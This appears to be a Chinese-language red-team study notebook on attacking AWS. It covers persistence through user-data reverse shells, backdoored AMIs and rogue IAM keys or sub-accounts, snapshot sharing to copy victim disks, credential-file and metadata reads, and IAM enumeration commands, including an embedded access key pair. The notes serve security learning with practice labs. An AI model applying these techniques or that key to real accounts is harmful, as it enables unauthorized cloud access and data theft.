在上文描述到用户数据的时候，可以很容易发现用户数据可以被用来做权限维持，只需要将要执行的命令改成反弹 Shell 的命令即可。

但是也许目标可能很长时间都不会重启实例，而且用户数据也只有实例停止时才能修改，因此还是传统的权限维持方式会更具有优势些，这样来看使用用户数据进行权限维持显得就有些鸡肋了。

2.后门镜像

当攻击者获取到控制台权限后，可以看看目标的 AMI（Amazon 系统镜像），如果可以对其进行修改或者删除、创建的话，RT 就可以将原来的镜像替换成存在后门的镜像。

这样当下次目标用户在选用该镜像创建实例的时候，就会触发我们在镜像中植入的恶意代码了。

3.创建访问密钥

如果当前环境可以创建新的访问密钥，则可以在 IAM 中创建访问密钥进行权限维持。

4.创建辅助账号

除了以上的权限维持方法，还可以通过在 IAM 中创建高权限子账号的方式进行权限维持，然后通过这个子账号进行后续的持续攻击行为。

5.其他的权限维持方法)5、其他的权限维持方法

除了上述方法外，还可以通过在实例中添加隐藏用户、安装远控软件等等传统方法进行权限维持。



## 防御绕过

TODO

## 信息收集

### 共享快照

如果当前凭证具有 EC2:CreateSnapshot 权限的话，可以通过创建共享快照的方式，然后将自己 aws 控制台下的实例挂载由该快照生成的卷，从而获取到目标 EC2 中的内容。

利用工具有CloudCopy。

#### 公有快照

```bash
#检测公有快照
aws ec2 describe-snapshots --owner-id self --restorable-by-user-ids all --no-paginate
```





随便找一个快照，点击创建卷，卷的大小需要大于或等于快照大小，这里创建一个 20G 大小的卷，另外可用区需要和自己的 EC2 保持一致，最后快照 ID 指定刚才随便找的快照。

然后选择挂载卷，将快照挂载到自己的实例中即可。

```bash
sudo fdisk -l
sudo mkdir /test
sudo mount /dev/xvdf3 /test
sudo ls /test
```

#### 私有快照

在拿到目标 AWS 控制台权限时，如果无法登录到实例，可以为目标实例打个快照，然后将快照共享给自己。

在修改权限中设置快照的共享账号即可。

### 元数据

参考上文

### 云服务访问密钥

如果目标在实例上配置了 AWS 命令行工具，那么在 `~/.aws/credentials` 路径下，可以看到所配置的访问密钥

### 用户数据

在获取到目标实例的权限后，在 /var/lib/cloud/instances/instance-id/ 目录下可以看到当前实例的用户数据。（instance-id需要修改）

```bash
root@VM-0-6-ubuntu:/var/lib/cloud/instances/ins-cqke0rtt# ls
boot-finished     datasource  obj.pkl  sem            user-data.txt.i          vendor-data.txt
cloud-config.txt  handlers    scripts  user-data.txt  vendor-cloud-config.txt  vendor-data.txt.i
```



在 /var/log/cloud-init-output.log 中可以看到用户数据执行的日志

或者直接使用元数据服务获取用户数据内容，如果返回 404 说明没有用户数据

```
curl http://169.254.169.254/latest/user-data
curl http://metadata.tencentyun.com/latest/user-data
```

### 网段信息

在进行横向移动时，如果知道目标存在哪些网段可以起到事半功倍的效果，在云场景下，可以直接通过控制台看到目标的网段情况。

以及命令后：

```bash
aws ec2 describe-subnets --query 'Subnets[].CidrBlock'
```

# Amazon Cognito

Amazon Cognito 是 Web 和移动应用程序的身份平台。它是用户目录、身份验证服务器以及 OAuth 2.0 访问令牌和 AWS 凭证的授权服务。使用 Amazon Cognito，您可以对内置用户目录、企业目录以及 Google 和 Facebook 等使用者身份提供者中的用户进行身份验证和授权。



Cognito主要由两个核心服务组成：**User Pools** （用户池）and **Federated Identities (Identity Pools，身份池)**



![image-20231024105739097](AWS.assets/image-20231024105739097.png)

1. 客户端根据用户池进行身份验证。
2. 用户池将三个 JSON Web 令牌 (JWT) 分配给（Id、Access 和 Refresh）
3. Id JWT 将传递到身份池，并通过 JWT 声明选择角色。 然后，用户会收到临时 IAM 凭证，其权限基于映射到用户所属组的 IAM 角色。
4. 然后，用户可以根据其权限调用 AWS 资源。



## 用户池

![image-20231024110407841](AWS.assets/image-20231024110407841.png)



当您想要对您的应用程序或 API 进行身份验证和授权时，请创建用户群体。用户群体是一个用户目录，既有自助服务，也有管理员驱动的用户创建、管理和身份验证。用户群体可以是独立的目录和 OIDC 身份提供者（IdP），也可以是员工身份和客户身份的第三方提供者的中间服务提供者（SP）。组织的 SAML 2.0 和 OIDC IdP 将员工身份引入 Cognito 和您的应用程序。OAuth 2.0 的公有身份存储 Amazon、Google、Apple 和 Facebook 引入了客户身份。

用户群体不要求与身份池集成。从用户群体中，您可以直接向应用程序、Web 服务器或 API 颁发经过身份验证的 JSON Web 令牌（JWT）。



## 身份池

![image-20231024110443951](AWS.assets/image-20231024110443951.png)

当您想要授权经过身份验证的用户或匿名用户访问您的 AWS 资源时，请设置 Amazon Cognito 身份池。身份池为您的应用程序颁发 AWS 凭证，以便向用户提供资源。您可以使用可信身份提供者（如用户群体或 SAML 2.0 服务）对用户进行身份验证。此身份提供者还可以选择为访客用户颁发凭证。身份池同时使用基于角色和基于属性的访问控制来管理您的用户访问 AWS 资源的授权。

身份池不要求与用户群体集成。身份池可以直接接受来自员工和使用者身份提供者的经过身份验证的声明。



















# SQS消息队列服务

SQS (Simple Queue Service) 可以用来帮助不同的应用程序之间进行可靠的消息传递，它就像是一个消息中转站，可以把消息从一个地方发送到另一个地方，确保消息的安全送达和处理，让应用程序之间更好地进行通信和协作。



Queue URL 的主要构成部分就是 Account ID(092297851374) 和 Queue(wiz-tbic-analytics-sqs-queue-ca7a1b2)。

```bash
#接收信息
aws sqs receive-message --queue-url https://sqs.us-east-1.amazonaws.com/092297851374/wiz-tbic-analytics-sqs-queue-ca7a1b2
```

SQS 服务，应该避免允许公开接收队列的消息，避免在传输消息时造成敏感信息的泄露。



# RDS信息收集



TODO

```bash
Amazon Aurora (port 3306)
PostgreSQL (5432)
MySQL (port 3306)
MariaDB (port 3306)
Oracle Database (port 1521)
SQL Server (port 1433)
```



# SSM(AWS System Manager)

参考https://zhuanlan.zhihu.com/p/549720346





- 可以使用 SSM 来组织、监控 AWS 资源并对其自动执行管理任务，SSM可以帮助我们管理大规模的EC2实例以及本地的服务器。
- 它提供了管理基础架构的运营洞察力，将需要管理的资源进行标记后，可以在SSM中查看整合的信息，能够帮助我们很容易的提前发现问题所在。
- 如果您需要为很多EC2实例打系统补丁，就可以使用SSM来做，这部分的内容在SAP认证考试中会出现，我们在后面也会详细的讨论，您需要记住所有相关的步骤。
- SSM支持WINDOWS和LINUX操作系统，并与多个AWS服务集成，如CloudWatch指标和仪表盘，以及AWS config，通过它跟踪EC2实例的配置，等等。
- SSM的大部分功能是免费的，部分功能需要付费。

![img](AWS.assets/v2-3098648dbc3f01258ba300219f1365e8_1440w.webp)

**运营管理，提供了一系列的服务帮助管理AWS资源，包括：**

- Explorer ，可以跨AWS区域显示您的AWS资源相关数据的聚合视图(OpsData和OpsItems)。
- OpsCenter，可以聚合多个AWS服务中的事件集中查看和管理，降低解决问题的平均时间。
- CloudWatch仪表盘以及PHD仪表盘。

**应用程序管理，包括：**

- 资源组，提供了查找和分组AWS资源的功能，可以查看整组资源的分析报告以及可对资源组的资源运行复杂的任务。
- Appconfig，提供了应用程序配置管理和部署。
- 参数仓库，Parameter Store，用于集中管理密钥和配置数据等，将敏感数据与代码和配置分离。

**执行和变更，包括：**

- 自动化，可以简化常规的任务，将常见的IT任务定义成SSM文档的一系列步骤，并对资源大规模执行这些步骤。如自动关闭EC2实例或自动创建AMI等。
- 变更日历，可以通过制定一个时间范围，允许或者阻止在指定时间范围内对AWS资源执行变更。
- 可以通过创建维护窗口，为大批量实例安排并实施常规任务。如给实例打补丁、执行自动化任务，或在指定期间执行其他可能中断性任务。

**然后，实例和节点，包括：**

- 合规性，配置并监控管理的EC2实例的的补丁安装和状态管理器配置合规性数据，集中管理合规性，修复合规性问题。
- 清单，Inventory，提供了收集管理实例的元数据，如已安装应用程序，网络配置，更新包等
- 托管实例及混合激活，提供混合云和跨云的管理，将这些资源安装和激活SSM相关的功能等
- 会话管理器，只需要一次点击就可以安全登陆实例，不需要开启SSH服务，且无需配置入站策略和管理堡垒机。
- 运行命令，Run Command，可以安全、批量的在您管理的EC2实例上运行命令而不需要ssh通道。
- 状态管理器，定义和维护操作系统或应用程序的配置，集中对配置进行管理。
- 补丁管理，Patch Manager自动化安装、修补系统补丁。
- 最后，Distributor用于打包自己的软件或查找AWS提供的软件并安装部署。





# ECS

ECS(Amazon Elastic Container Service)，亚马逊弹性容器服务。是一个有高度扩展性的**容器管理服务**。它可以轻松运行、停止和管理集群上的Docker容器，你可以将容器安装在EC2实例上，或者使用**Fargate**来启动你的服务和任务。

Amazon ECS中有三层：

- 容量 - 容器运行的基础设施
- 控制器 - 部署和管理在容器上运行的应用程序
- 配置 - 可用于与调度程序交互以部署和管理应用程序和容器的工具

![                 显示容量、控制器和配置层的图表。             ](AWS.assets/ecs-layers-20231026113033412.png)



容量：

- AWS 云中的 Amazon EC2 实例

  您可以选择实例类型、实例数量并管理容量。

- AWS 云中的无服务器 (AWS Fargate (Fargate))

  Fargate 是一种无服务器、即用即付的计算引擎。借助 Fargate，您无需管理服务器、处理容量规划或隔离容器工作负载以确保安全。

- 本地虚拟机 (VM) 或服务器

  Amazon ECS Anywhere 支持将外部实例（例如本地服务器或虚拟机 (VM)）注册到 Amazon ECS 集群。



要在Amazon ECS上部署应用程序，必须构建你的程序在**容器**中运行。如之前所说，**Docker容器是一个集装箱**，在集装箱里面有软件应用程序运行所需要的一切，包括了代码、运行环境、系统工具、系统函数库等等。



**任务定义（Task Definition）：**要在Amazon ECS上运行应用程序，你需要创建任务定义。任务定义是一个JSON格式的文本文件，这个文件定义了构建应用程序的各种参数。这些参数包括了：要使用哪些容器镜像，使用哪种启动类型，打开什么端口，使用什么数据卷等等。**任务** 是集群内的任务定义的实例化。您可以运行独立任务，也可以将任务作为服务的一部分运行。



**调度（Scheduling）：**ECS任务调度负责将任务放置到集群中，你可以定义一个**服务（Service）**来运行和管理一定数量的任务。

**服务调度（Service Scheduler）**

- 保证了一定数量的任务持续地运行，如果任务失败了会自动进行重新调度
- 保证了任务内会注册一个ELB给所有容器

**自定义调度（Custom Scheduler）**

- 你可以根据自己的业务需求来创建自己的调度
- 利用第三方的调度



**集群（Cluster）：**当你使用Amazon ECS运行任务时，你的任务会放在到一个逻辑的资源池上，这个池叫做**集群（Cluster）**。集群上主要有有EC2和FARGATE两种计算资源，对应任务的两种启动类型：Fargate启动类型和ec2启动类型。不过不管是什么类型，任务都是以容器为单位划分资源的，也就是说任务是跑在docker容器中的。

- Fargate 启动类型：只需定义任务，无需预置和管理后台基础设施，ECS会自动创建容器运行该任务。
- EC2 启动类型：在集群中管理的 EC2 实例上创建容器并运行任务。



![img](AWS.assets/ECS05.png)



**容器代理（Container Agent）：**

在Amazon ECS上运行的容器实例实际上是运行了ECS**容器代理（Container Agent）**的EC2实例。

容器代理会在Amazon ECS集群内的每个基础设施资源上运行。使用容器代理可以让容器实例和集群进行通信，它可以向ECS发送有关资源当前运行的任务和资源使用率的信息。

容器代理可以接受ECS的请求进行启动和停止任务。





















# IAM身份和访问管理



## cli

```bash

aws sts get-caller-identity

aws iam get-user
#枚举可能属于的所有组
aws iam list-groups-for-user --user-name dev01


#列出附加的用户策略
aws iam list-attached-user-policies --user-name dev01
#列出策略AmazonGuardDutyReadOnlyAccess的版本，--policy-arn从list-attached-user-policies中获得。Amazon 和客户管理的策略可以有多个版本，允许您保留、查看和回滚到以前的策略版本。内联策略不支持版本控制。
aws iam list-policy-versions --policy-arn arn:aws:iam::aws:policy/AmazonGuardDutyReadOnlyAccess

#获得对应版本的policy
aws iam get-policy-version --policy-arn arn:aws:iam::aws:policy/AmazonGuardDutyReadOnlyAccess --version-id v3


#列出内联策略，AWS IAM 中的内联策略是直接嵌入到单个 IAM 用户、组或角色中的策略，并且不能单独管理或重复使用。
aws iam list-user-policies --user-name dev01
#获得内联策略
aws iam get-user-policy --user-name dev01 --policy-name S3_Access

#获取有关role的信息
aws iam get-role --role-name BackendDev
#获取附加的角色policy
aws iam list-attached-role-policies --role-name BackendDev
#列出role的内联策略
aws iam list-role-policies --role-name Cognito_StatusAppAuth_Role --no-cli-pager
```







## 查看自己拥有的权限

### enumerate-iam

```bash
#枚举当前拥有的所有权限
python3.10 enumerate-iam.py --access-key AKIAWHEOTHRFYM6CAHHG --secret-key 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
```





```bash
#查看自己当前的用户
aws iam get-user

#查看自己的权限(不过能看到自己权限的前提是需要先拥有 iam 的相关权限，不然就会返回 AccessDenied)
aws iam list-attached-user-policies --user-name feng
```





## 控制台接管

CF







# 靶场

[bigiamchallenge.com](https://wiki.teamssix.com/CloudService/IAM/bigiamchallenge.com)

https://pwnedlabs.io/dashboard

# 参考

https://zone.huoxian.cn/d/907-aws-s3

https://cloudsec.huoxian.cn/
